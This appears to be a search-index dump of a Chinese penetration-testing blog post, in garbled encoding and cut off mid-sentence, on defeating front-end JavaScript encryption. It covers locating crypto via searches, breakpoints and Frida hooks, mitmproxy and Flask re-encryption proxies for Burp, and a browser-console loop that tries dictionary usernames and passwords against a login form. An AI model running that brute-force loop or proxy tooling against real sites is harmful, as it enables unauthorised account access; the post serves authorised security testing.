[{"categories":["Pentest"],"content":"æœ¬æ–‡ä¸»è¦ä»‹ç»å¸¸è§çš„åº”å¯¹å‰ç«¯JSåŠ è§£å¯†çš„æ–¹æ³• ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:0:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"é›¶ã€ç®€è¿° å¸¸è§éœ€è¦å‰ç«¯JSè°ƒè¯•å®ŒæˆåŠ è§£å¯†å¯¹æŠ—çš„æƒ…å†µæœ‰ï¼š å‚æ•°å€¼åŠ å¯†ï¼šå¦‚ç™»å½•è¿‡ç¨‹ä¸­å¯¹ç”¨æˆ·åã€å¯†ç è¿›è¡Œäº†åŠ å¯†ï¼› é”®å€¼åŠ å¯†ï¼šå¯¹å‚æ•°çš„é”®å€¼éƒ½è¿›è¡Œäº†åŠ å¯†ï¼› æ•°æ®åŒ…å…¨åŠ å¯†ï¼šå¯¹æ•°æ®åŒ…è¯·æ±‚ä½“è¿›è¡Œäº†å…¨åŠ å¯†ï¼› æ•°æ®åŒ…ç­¾åï¼šå¯¹æ•°æ®åŒ…å†…å®¹è¿›è¡Œäº†æŸç§ç­¾åç®—æ³•ä»¥é˜²ç¯¡æ”¹ï¼› ç»„åˆåˆ©ç”¨ å¸¸è§åŠ è§£å¯†æ–¹æ³•æœ‰ï¼š å¯¹ç§°åŠ å¯†ï¼šAESã€SM4(å›½å¯†)ã€ DESã€3DESã€SM1ã€SM7ã€RC5ã€RC6ã€RC4ã€ZUCã€SSF446ç­‰ ç‰¹ç‚¹ï¼šåŠ è§£å¯†ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥ï¼Œå¯é€† éå¯¹ç§°åŠ å¯†ï¼šRSA, SM2. SM9, Rabin, DH, DSA, ECC ç‰¹ç‚¹ï¼šå¯†é’¥æ˜¯æˆå¯¹çš„ï¼Œåˆ†ä¸ºå…¬é’¥å’Œç§é’¥ï¼› æ•£åˆ—ç®—æ³•ï¼šMD5ã€ SM3ã€ MAC, HMAC, SHA-1, SHA-2 (SHA-224. SHA-256, SHA-512/224. SHA-512/256) ç­‰ ç‰¹ç‚¹ï¼šæ— å¯†é’¥ï¼Œä¸å¯é€†ï¼Œå›ºå®šé•¿åº¦ é—®é¢˜è§£å†³æ€è·¯ï¼š åˆ†æåŠ å¯†ç®—æ³•ï¼Œç¡®è®¤åŠ å¯†æ–¹å¼ï¼Œè¿˜åŸåŠ è§£å¯†æµç¨‹ åˆ†æå¯†é’¥æ¥æºï¼š è‹¥ä¸ºå®¢æˆ·ç«¯ç”Ÿæˆå¯†é’¥ï¼šå¯†é’¥å›ºå®šï¼ˆç¡¬ç¼–ç å¯†é’¥ï¼‰/å¯†é’¥éšæœºï¼ˆåˆ†æå¯†é’¥ç”Ÿæˆç®—æ³•ï¼‰ è‹¥ä¸ºæœåŠ¡å™¨è¿”å›å¯†é’¥ï¼šåˆ™é‡æ–°å»ºç«‹è¿æ¥å¹¶è¿›è¡ŒæŠ“åŒ…ï¼Œè·å–å¯†é’¥ï¼Œå†åŠ è§£å¯† è‹¥æ— æ³•è¿˜åŸåŠ è§£å¯†æµç¨‹ï¼šé€šå¸¸æ˜¯å­˜åœ¨é­”æ”¹ç®—æ³•æˆ–æ··æ·†åœºæ™¯ï¼Œé€šè¿‡å®šä½æ˜æ–‡å°†å…¶è½¬å‘ï¼Œç¯¡æ”¹æ˜æ–‡åå†è½¬å‘å›å»èµ°åŠ å¯†æµç¨‹ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:1:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"ä¸€ã€å¸¸è§åŠ è§£å¯†å®šä½ å¸¸è§çš„æ¸—é€æµ‹è¯•åœºæ™¯åŒ…æ‹¬web/å°ç¨‹åº/å…¬ä¼—å·/appï¼Œåœ¨ä¸åŒåœºæ™¯ä¸‹çš„åˆ†ææ–¹æ³•æœ‰æ‰€åŒºåˆ«ã€‚ æœ¬æ–‡ä¸»è¦ä»¥Webç«¯ä¸ºä¾‹ï¼Œå…¶ä»–åœºæ™¯ä¸è¿‡å¤šè®¨è®ºã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"webç«¯ å®šä½åŠ å¯†ç®—æ³•ï¼š 1ã€å…¨å±€æœç´¢å…³é”®å­— å‚æ•°åã€â€œå‚æ•°å=ã€å‚æ•°å=ã€å‚æ•°åï¼š URIã€APIæ¥å£ã€åŠ å¯†ç®—æ³•å…³é”®è¯ encrypt, decrypt, JSON.stringify, JSON.parse, secretï¼Œsecretkeyï¼Œpublickey, privatekeyï¼Œpaddingï¼Œ key, aes, sm4, rsa, sm2ï¼Œdes, iv, pkcs æœç´¢çš„å…³é”®è¯è¶ŠçŸ­ï¼Œå‡ºæ¥çš„è¯¯æŠ¥ä¹Ÿå°±è¶Šå¤šï¼Œæ‰€ä»¥è¦é€‰å¥½å…³é”®è¯ 2ã€æ–­ç‚¹è°ƒè¯• æ‰¾åˆ°ä¸€äº›å…³é”®è¯æˆ–å…³é”®åŠ¨ä½œæ‰“ä¸Šæ–­ç‚¹ï¼Œæ¯”å¦‚ç–‘ä¼¼åŠ è§£å¯†å‡½æ•°éƒ¨åˆ†ï¼Œé¼ æ ‡ç‚¹å‡»ç‰¹å®šæŒ‰é’®äº‹ä»¶ï¼Œç½‘ç»œè¯·æ±‚ç­‰ã€‚ è°ƒç”¨å †æ ˆï¼šå¯åœ¨æµè§ˆå™¨ç‚¹å‡»å¯¹åº”è¯·æ±‚åï¼Œå³ä¾§é¢æ¿æŸ¥çœ‹è¯·æ±‚è°ƒç”¨å †æ ˆï¼Œç„¶åæ‰“æ–­ç‚¹è·Ÿè¸ªå®šä½ XHRæ–­ç‚¹ï¼šåœ¨sourceèµ„æºé¢æ¿å³ä¸‹è§’ï¼Œå¯ä»¥æ·»åŠ URLå…³é”®å­—ï¼Œåœ¨å‘èµ·ç½‘ç»œè¯·æ±‚æ—¶è§¦å‘ äº‹ä»¶ç›‘å¬æ–­ç‚¹ï¼šå¯ä»¥åœ¨å‘ç”Ÿç›¸å…³äº‹ä»¶æ—¶è§¦å‘æ–­ç‚¹ï¼Œå¦‚ç™»é™†æ—¶è§¦å‘clickç‚¹å‡»äº‹ä»¶ DOMæ–­ç‚¹ï¼šå¯ä»¥åœ¨å­å…ƒç´ æ”¹å˜æ—¶ã€å±æ€§æ”¹å˜æ—¶å’Œå…ƒç´ è¢«ç§»é™¤æ—¶è§¦å‘æ–­ç‚¹ï¼Œå¦‚æ»‘å—éªŒè¯ç  3ã€hook åœ¨æ‰¾ä¸åˆ°å…³é”®å­—æ—¶ï¼Œå¦‚æ··æ·†åœºæ™¯ä¸‹ï¼Œå¯ä»¥é€šè¿‡hookæŸäº›é€šç”¨æ–¹æ³•å¯»æ‰¾çªç ´å£ï¼Œå¦‚ JSON.stringifyã€JSON.parse è¿˜å¯ä»¥hookå¦‚ cookieã€headerã€URLã€evalã€Functionã€ç»•debuggerç­‰ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:1","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"APPç«¯ å®šä½åŠ å¯†ç®—æ³•ï¼š 1ã€é™æ€åˆ†æ éœ€è¦å…ˆå¯¹APPè¿›è¡Œé€†å‘ï¼Œé€šè¿‡è„±å£³åç¼–è¯‘å¾—åˆ°æºç ï¼› ç„¶åä¹Ÿæ˜¯jadxå…¨å±€æœç´¢å…³é”®å­—ï¼Œç±»ä¼¼Webæ€è·¯ï¼Œæœç´¢å¦‚signï¼ŒåŠ å¼•å·çš„â€œsignâ€ç­‰ã€‚ 2ã€hook ä¹Ÿå¯ä»¥é€šè¿‡fridaæ¥hookä¸€äº›javaå±‚çš„å¸¸è§ç±»/æ–¹æ³•ã€‚ JAVA å±‚å¸¸è§æ–¹æ³•hookï¼š HashMapçš„putæ–¹æ³•ï¼› Logæ—¥å¿—ï¼› JSONObjectçš„ Jputã€JgetStringæ–¹æ³•ï¼› å…¶ä»–ï¼Œå¦‚ï¼š ArrayListçš„addã€addAllã€setæ–¹æ³•ç­‰ï¼› TextUtilsçš„isEmptyæ–¹æ³•ï¼› Collectionsçš„sort æ–¹æ³•ï¼› Toastçš„showæ–¹æ³•ï¼› Stringçš„getBytesã€ isEmptyæ–¹æ³•ã€StringBuilder, StringBufferï¼› å¸¸è§åŠ å¯†åº“ç›¸å…³çš„hookï¼ˆè‡ªåç®—æ³•ï¼‰ç­‰ 3ã€åŠ¨æ€è°ƒè¯•ï¼š logæ’æ¡©ã€JEBã€IDAã€unidbg 4ã€H5è°ƒè¯• Androidï¼š å®‰å“æ‰‹æœºå¼€å¯adbè°ƒè¯•ï¼Œ ç”µè„‘ç«¯ Edgeæµè§ˆå™¨è®¿é—®edge://inspectï¼ŒChromeæµè§ˆå™¨è®¿é—®chrome://inspect æ‰‹æœºè®¿é—®h5é¡µé¢ï¼Œåœ¨æµè§ˆå™¨ç‚¹å‡»inspectæ‰“å¼€ devtoolså³å¯è°ƒè¯• IOSï¼š mac safariè®¾ç½®ä¸­å¼€å¯ç½‘é¡µå¼€å‘è€…åŠŸèƒ½ iphoneä¸‹safariè®¾ç½®ä¸­å¼€å¯JavaScriptã€ç½‘é¡µæ£€æŸ¥å™¨ åœ¨æ‰‹æœºSafari æµè§ˆå™¨æ‰“å¼€éœ€è¦è°ƒè¯•çš„ç½‘ç«™ï¼Œç„¶ååœ¨ç”µè„‘ä¸Šçš„Safariæµè§ˆå™¨ç‚¹å‡»ã€å¼€å‘ã€-\u003eã€é€‰æ‹©ä½ çš„æ‰‹æœºã€-\u003eã€é€‰æ‹©éœ€è¦è°ƒè¯•çš„ç½‘å€ã€å³å¯æ‰“å¼€æ‰‹æœºç½‘é¡µçš„æ§åˆ¶å° å·¥å…·ï¼š iOS WebKit Debug Proxy ï¼Œæ”¯æŒMacã€Windowsã€Linux è°ƒè¯• IOS ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:2","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"å°ç¨‹åº å¼€å¯å°ç¨‹åºè°ƒè¯•ï¼š WeChatOpenDevToolï¼Œå¾®ä¿¡å°ç¨‹åºå¼ºåˆ¶å¼€å¯å¼€å‘è€…å·¥å…·ï¼Œä¹Ÿé€‚ç”¨äºå¼€å¯å¾®ä¿¡å†…ç½®æµè§ˆå™¨F12æ§åˆ¶å° ç„¶åå¯ä»¥åƒWebä¸€æ ·è¿›è¡Œè°ƒè¯• ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:3","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"å…¬ä¼—å· å¾®ä¿¡å†…ç½®æµè§ˆå™¨è°ƒè¯• æ‰‹æœºç”¨usbè¿æ¥è‡³ç”µè„‘ æ‰‹æœºå¾®ä¿¡å†…ç‚¹å‡»http://debugxweb.qq.com/?inspector=trueï¼ˆåªè¦è·³è½¬è¿‡å¾®ä¿¡é¦–é¡µå°±æ˜¯å¼€å¯äº†è°ƒè¯•ï¼‰ å¾®ä¿¡å†…æ‰“å¼€æ‰€éœ€è°ƒè¯•ç½‘å€, ä¾‹å¦‚weixin.qq.com chromeæµè§ˆå™¨æ‰“å¼€chrome://inspect/#devicesä¼šçœ‹åˆ°æˆ‘ä»¬æ‰“å¼€çš„ç½‘é¡µweixin.qq.com Edgeæµè§ˆå™¨ edge://inspect åœ¨ç‚¹å‡»chromeé‡Œçš„inspect ç›´æ¥è°ƒè¯•(å¯ä»¥ç›´æ¥ç”¨é¼ æ ‡è¿›è¡Œæ“ä½œ) å…¶ä»–H5è°ƒè¯•æ–¹æ³•ï¼š npm install -g spy-debugger spy-debuggerï¼Œå¾®ä¿¡è°ƒè¯•ï¼Œå„ç§WebViewæ ·å¼è°ƒè¯•ã€æ‰‹æœºæµè§ˆå™¨çš„é¡µé¢çœŸæœºè°ƒè¯•ã€‚ä¾¿æ·çš„è¿œç¨‹è°ƒè¯•æ‰‹æœºé¡µé¢ã€æŠ“åŒ…å·¥å…·ï¼Œæ”¯æŒï¼šHTTP/HTTPSï¼Œæ— éœ€USBè¿æ¥è®¾å¤‡ã€‚ ä¸Šé¢æåˆ°çš„ WeChatOpenDevTool ä¹Ÿå¯ç”¨ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:4","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"äºŒã€è‡ªåŠ¨åŠ è§£å¯†æ€è·¯ å®šä½åˆ°å…³é”®åŠ è§£å¯†å‡½æ•°åï¼Œå¯ä»¥äº†è§£åˆ°ç¨‹åºçš„åŠ è§£å¯†æµç¨‹å’Œç®—æ³•ã€‚ä¸€äº›å¸¸è§çš„åŠ è§£å¯†ç®—æ³•å¯ä»¥é€šè¿‡ cyberchef è¿›è¡ŒéªŒè¯ã€‚ åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è‚¯å®šæ— æ³•æ¥å—æ¯æ¬¡è¿›è¡Œæ‰‹åŠ¨åŠ è§£å¯†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€äº›æ–¹æ³•å®Œæˆè‡ªåŠ¨åŒ–åŠ è§£å¯†ï¼Œå¸¸è§æ–¹æ³•æœ‰ï¼š æµè§ˆå™¨æ§åˆ¶å°ç¼–å†™JSä»£ç  ä»£ç†æœåŠ¡ä¸­è½¬ JSRPCè°ƒè¯• CDPè°ƒè¯• ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:3:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"ä¸‰ã€æ§åˆ¶å°æ¨¡æ‹Ÿæ“ä½œ å¹³æ—¶æµ‹è¯•çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›æ¥å£ï¼ˆå¦‚ç™»é™†æ¥å£ï¼‰ä¸­çš„æŸäº›æ•°æ®æ˜¯åŠ å¯†çš„ã€‚ é€šå¸¸é€»è¾‘æ˜¯é€šè¿‡å¯¹JSä»£ç è¿›è¡Œé€†å‘åˆ†æåï¼Œäº†è§£åˆ°å‰ç«¯åŠ å¯†ç®—æ³•å’Œå…³é”®å‡½æ•°ï¼Œæ‹¿åˆ°å¯†é’¥ï¼Œç„¶åç¼–å†™ç›¸åº”è„šæœ¬æ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹æ„é€ æƒ³è¦çš„æ•°æ®ã€‚ å¯¹äºä¸€äº›ç®€å•çš„åœºæ™¯ä¹Ÿå¯ä»¥é€šè¿‡JSæ¨¡æ‹Ÿå‰ç«¯çš„æ“ä½œï¼Œå¯ä»¥å…å»å¯¹åŠ è§£å¯†çš„è°ƒè¯•ã€‚ æ•´ç†æµç¨‹å¦‚ä¸‹ï¼š å®šä½è¾“å…¥æ¡†å’ŒæŒ‰é’® è®¾ç½®æ•°æ® ç‚¹å‡»æŒ‰é’® åˆ†æå‰ç«¯ä»£ç ï¼Œæ‰¾åˆ°æˆ‘ä»¬è¦çš„ç™»å½•æ¡†è¾“å…¥ç‚¹ ç„¶åå®šä½åˆ°æ•°æ®ï¼Œæœ‰jqueryçš„è¯ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œæ²¡æœ‰å°±ä½¿ç”¨åŸç”Ÿçš„jsä¹Ÿä¸å½±å“ document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] å¦‚æœä¸å¥½æ‰¾ï¼Œå¯ä»¥ç›´æ¥ç¼–è¾‘htmlï¼Œæ‰‹åŠ¨æ·»åŠ idå±æ€§ï¼Œç„¶åé€šè¿‡idè¿›è¡Œå®šä½ \u003cinput id=\"testusername\" data-v-ad2189ae=\"\" type=\"text\" name=\"username\" placeholder=\"è¯·è¾“å…¥æ‰‹æœº/é‚®ç®±\"\u003e document.getElementById(\"testusername\") å®šä½åè¯¥æ’å…¥æ•°æ®çš„å°±æ’å…¥æ•°æ®ï¼Œè¯¥ç‚¹å‡»çš„å°±ç‚¹å‡»ï¼Œå…·ä½“çœ‹ä¸‹é¢çš„å®ç°ä»£ç  // è®¾ç½®ç”¨æˆ·åã€å¯†ç å­—å…¸åˆ—è¡¨ var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root',...,'FALSE'); // éå†å­—å…¸åˆ—è¡¨ï¼Œæ’å…¥ç›¸åº”æ•°æ®ï¼Œæ¨¡æ‹Ÿç‚¹å‡»æ“ä½œ for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } æ•ˆæœï¼š ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:4:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"å››ã€ä»£ç†æœåŠ¡ä¸­è½¬ é€šè¿‡å¯¹JSä»£ç è¿›è¡Œé€†å‘åˆ†æåï¼Œäº†è§£åˆ°å‰ç«¯åŠ å¯†ç®—æ³•å’Œå…³é”®å‡½æ•°ï¼Œæ‹¿åˆ°å¯†é’¥åï¼Œç„¶åç¼–å†™ç›¸åº”è„šæœ¬æ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹æ„é€ æƒ³è¦çš„æ•°æ®ã€‚ ç¼–å†™é€šè¿‡å·¥å…·æˆ–Pythonè„šæœ¬ç­‰è¿›è¡Œä»£ç†ä¸­è½¬ï¼Œé€šè¿‡è„šæœ¬å¯¹æ•°æ®åŒ…è¿›è¡ŒåŠ è§£å¯†å¤„ç†ã€‚ ä»‹ç»ä¸€äº›ç›¸å…³å·¥å…· mitmproxy Burpæ’ä»¶autoDecoder Yakkit çƒ­åŠ è½½ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"MITMProxy mitmproxy æ˜¯ä¸€æ¬¾å…è´¹çš„å¼€æºäº¤äº’å¼ HTTPS ä»£ç†å·¥å…·ã€‚ Githubé¡¹ç›®åœ°å€ å®˜æ–¹æ–‡æ¡£ è¯¦ç»†ç‰ˆæ–‡æ¡£ï¼Œå†™è„šæœ¬æ—¶æ¨èå‚è€ƒ è¿™é‡Œä½¿ç”¨Burp+mitmproxyè¿›è¡Œé…åˆï¼Œå¯ä»¥é…ç½®ä¸Šä¸‹æ¸¸ä»£ç†è¿›è¡ŒåŠ è§£å¯† é…ç½®ä¸‹æ¸¸ä»£ç†ï¼š åˆ™æ˜¯æ¥æ”¶å®¢æˆ·ç«¯åŠ å¯†è¯·æ±‚è¿›è¡Œè§£å¯†ï¼Œå°†è§£å¯†åæ•°æ®åŒ…å‘ç»™burpã€‚ å½“æ¥æ”¶burpåˆ°æ˜æ–‡åè¿›è¡ŒåŠ å¯†ï¼Œå°†åŠ å¯†åæ•°æ®åŒ…å‘ç»™å®¢æˆ·ç«¯ã€‚ é…ç½®ä¸Šæ¸¸ä»£ç†ï¼š åˆ™æ˜¯æ¥æ”¶burpæ˜æ–‡è¯·æ±‚åè¿›è¡ŒåŠ å¯†ï¼Œå°†åŠ å¯†åæ•°æ®åŒ…å‘ç»™æœåŠ¡ç«¯ã€‚ å½“æ¥æ”¶æœåŠ¡ç«¯åŠ å¯†å“åº”ï¼Œè§£å¯†ï¼Œå‘ç»™burpã€‚ 1ã€ä¸‹æ¸¸ä»£ç†ï¼šè¯·æ±‚è§£å¯†ï¼Œå“åº”åŠ å¯†ï¼ˆå¦‚decrypt.pyï¼‰ mitmdump --mode upstream:http://127.0.0.1:8080 -s decrypt.py --listen-port 9999 --ssl-insecure from mitmproxy import http, ctx import re from aesCipher import * class decryptData: # è§£å¯†è¯·æ±‚åŒ…ï¼Œå‘ç»™burp def request(self, flow: http.HTTPFlow) -\u003e None: info = ctx.log.info if \"www.test.com\" in flow.request.headers[\"Host\"]: try: param = flow.request.get_text pattern = r\"encryptedData=(.*)\" match = re.search(pattern, param) if match: plainText = decrypt_aes_cbc(match.group(1),key,iv) request_body = \"encryptedData=\" + plainText flow.request.set_text(request_body) except Exception as e: info(e) # åŠ å¯†å“åº”åŒ…ï¼Œå‘ç»™å®¢æˆ·ç«¯ def response(self, flow: http.HTTPFlow) -\u003e None: pass addons = [ decryptData() ] 2ã€ä¸Šæ¸¸ä»£ç†ï¼šè¯·æ±‚åŠ å¯†ï¼Œå“åº”åŠ å¯†ï¼ˆå¦‚encrypt.pyï¼‰ mitmdump -s encrypt.py --listen-port 8990 --ssl-insecure from mitmproxy import http, ctx import re from aesCipher import * class encryptData: # åŠ å¯†è¯·æ±‚åŒ…ï¼Œå‘ç»™æœåŠ¡å™¨ def request(self, flow: http.HTTPFlow) -\u003e None: info = ctx.log.info if \"www.test.com\" in flow.request.headers[\"Host\"]: try: param = flow.request.get_text pattern = r\"encryptedData=(.*)\" match = re.search(pattern, param) if match: cipherText = encrypt_aes_cbc(match.group(1),key,iv) request_body = \"encryptedData=\" + cipherText flow.request.set_text(request_body) except Exception as e: info(e) # è§£å¯†å“åº”åŒ…ï¼Œå‘ç»™burp def response(self, flow: http.HTTPFlow) -\u003e None: pass addons = [ encryptData() ] ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:1","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"autoDecoder é¡¹ç›®åœ°å€ï¼šhttps://github.com/f0ng/autoDecoder åŠ è§£å¯†æ–¹å¼ è‡ªå¸¦ç®—æ³•è¿›è¡ŒåŠ è§£å¯†ï¼šç›´æ¥é€šè¿‡æ’ä»¶è‡ªå¸¦çš„ç®—æ³•å»åŠ è§£å¯†æ•°æ®åŒ…(è¾ƒä¸ºç®€å•ï¼Œä»…æ”¯æŒéƒ¨åˆ†AESã€DESã€DESedeåŠ å¯†) è‡ªå®šä¹‰æ¥å£è¿›è¡ŒåŠ è§£å¯†ï¼šé€šè¿‡pythonçš„flaskæ¡†æ¶å»ç¼–å†™åŠ è§£å¯†æ•°æ®åŒ…çš„api ï¼Œå¯è‡ªå®šä¹‰åŠ è§£å¯†çš„å†…å®¹ï¼Œé»˜è®¤ä¼ å…¥çš„å‚æ•°æ˜¯æ•´ä¸ªè¯·æ±‚ä½“ï¼ˆrequest bodyï¼‰ä¸æ•´ä¸ªå“åº”ä½“ï¼ˆresponse bodyï¼‰ï¼Œæ”¯æŒå¤æ‚çš„åŠ è§£å¯†ç®—æ³•ï¼Œå½“ç„¶ï¼Œè¿™äº›éƒ½éœ€è¦è‡ªè¡Œå»å†™ä»£ç è§£å¯†äº† pythonä»£ç æ¨¡æ¿ # -*- coding:utf-8 -*- # author:f0ngf0ng from flask import Flask,Response,request from pyDes import * import base64 def des_encrypt(s): \"\"\" DES åŠ å¯† :param s: åŸå§‹å­—ç¬¦ä¸² :return: åŠ å¯†åå­—ç¬¦ä¸²ï¼Œ16è¿›åˆ¶ \"\"\" secret_key = \"f0ngtest\" iv = \"f0ngf0ng\" k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) en = k.encrypt(s, padmode=PAD_PKCS5) return base64.encodebytes(en).decode() def des_decrypt(s): \"\"\" DES è§£å¯† :param s: åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œ16è¿›åˆ¶ :return: è§£å¯†åçš„å­—ç¬¦ä¸² \"\"\" secret_key = \"f0ngtest\" iv = \"f0ngf0ng\" k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) de = k.decrypt(base64.decodebytes(bytes(s,encoding=\"utf-8\")), padmode=PAD_PKCS5) return de.decode() app = Flask(__name__) @app.route('/encode',methods=[\"POST\"]) def encrypt(): param = request.form.get('data') # è·å– post å‚æ•° encry_param = des_encrypt(param.strip(\"\\n\")) print(param) print(encry_param) return encry_param @app.route('/decode',methods=[\"POST\"]) def decrypt(): param = request.form.get('data') # è·å– post å‚æ•° decrypt_param = des_decrypt(param.strip(\"\\n\")) print(param) print(decrypt_param) return decrypt_param if __name__ == '__main__': app.debug = True # è®¾ç½®è°ƒè¯•æ¨¡å¼ï¼Œç”Ÿäº§æ¨¡å¼çš„æ—¶å€™è¦å…³æ‰debug app.run(host=\"0.0.0.0\",port=\"8888\") ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:2","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"Yakkit çƒ­åŠ è½½ Yakit æ˜¯ä¸€ä¸ªåŸºäºyakè¯­è¨€ç¼–å†™çš„å·¥å…·ï¼ŒåŠŸèƒ½ç±»ä¼¼Burpsuiteï¼Œä¸»è¦åŠŸèƒ½æœ‰æ‹¦æˆªhttp(s)æ•°æ®åŒ…ï¼Œæ¼æ´æ£€æµ‹ï¼Œç½‘ç«™åœ°å›¾ï¼Œè‡ªåŠ¨/æ‰‹åŠ¨æµ‹è¯•webåº”ç”¨ï¼Œç¼–ç è§£ç ï¼Œè¯·æ±‚ä¸å“åº”å·®å¼‚æ•°æ®åŒ–ç­‰åŠŸèƒ½ã€‚ çƒ­åŠ è½½ åœ¨èŠçƒ­åŠ 